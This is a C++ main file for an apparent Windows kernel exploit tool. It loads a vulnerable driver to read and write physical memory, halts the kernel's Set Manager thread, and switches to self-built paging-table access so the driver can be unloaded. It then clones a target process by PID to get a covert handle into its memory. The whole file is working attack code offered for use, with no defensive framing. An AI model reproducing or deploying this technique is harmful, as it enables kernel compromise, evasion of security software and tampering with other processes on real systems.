#include "vdm_ctx/vdm_ctx.hpp"
#include "mem_ctx/mem_ctx.hpp"
#include "pclone_ctx/pclone_ctx.hpp"
#include "set_mgr/set_mgr.hpp"

int __cdecl main(int argc, char** argv)
{
	if (argc < 3 || strcmp(argv[1], "--pid"))
	{
		std::printf("[!] please provide a process id... (--pid X)\n");
		return false;
	}

	const auto [drv_handle, drv_key] = vdm::load_drv();
	if (!drv_handle || drv_key.empty())
	{
		std::printf("[!] unable to load vulnerable driver...\n");
		return -1;
	}

	// read physical memory using the driver...
	vdm::read_phys_t _read_phys =
	[&](void* addr, void* buffer, std::size_t size) -> bool
	{
		return vdm::read_phys(addr, buffer, size);
	};

	// write physical memory using the driver...
	vdm::write_phys_t _write_phys =
	[&](void* addr, void* buffer, std::size_t size) -> bool
	{
		return vdm::write_phys(addr, buffer, size);
	};

	vdm::vdm_ctx vdm(_read_phys, _write_phys);
	nasa::mem_ctx my_proc(vdm);

	const auto set_mgr_pethread = set_mgr::get_setmgr_pethread(vdm);
	const auto result = set_mgr::stop_setmgr(vdm, set_mgr_pethread);

	std::printf("[+] set manager pethread -> 0x%p\n", set_mgr_pethread);
	std::printf("[+] result -> 0x%x\n", result);

	// read physical memory via paging tables and not with the driver...
	_read_phys = [&my_proc](void* addr, void* buffer, std::size_t size) -> bool
	{
		return my_proc.read_phys(buffer, addr, size);
	};

	// write physical memory via paging tables and not with the driver...
	_write_phys = [&my_proc](void* addr, void* buffer, std::size_t size) -> bool
	{
		return my_proc.write_phys(buffer, addr, size);
	};

	if (!vdm::unload_drv(drv_handle, drv_key))
	{
		std::printf("[!] unable to unload vulnerable driver...\n");
		return -1;
	}

	vdm.set_read(_read_phys);
	vdm.set_write(_write_phys);

	nasa::mem_ctx target_proc(vdm, std::atoi(argv[2]));
	nasa::pclone_ctx clone_ctx(&target_proc);
	const auto [clone_pid, clone_handle] = clone_ctx.clone();

	unsigned short mz = 0u;
	std::size_t bytes_read;
	ReadProcessMemory(clone_handle, GetModuleHandleA("ntdll.dll"), &mz, sizeof mz, &bytes_read);

	std::printf("[+] handle -> 0x%x, clone pid -> 0x%x\n", clone_handle, clone_pid);
	std::printf("[+] ntdll mz in clone -> 0x%x\n", mz);
	std::getchar();
}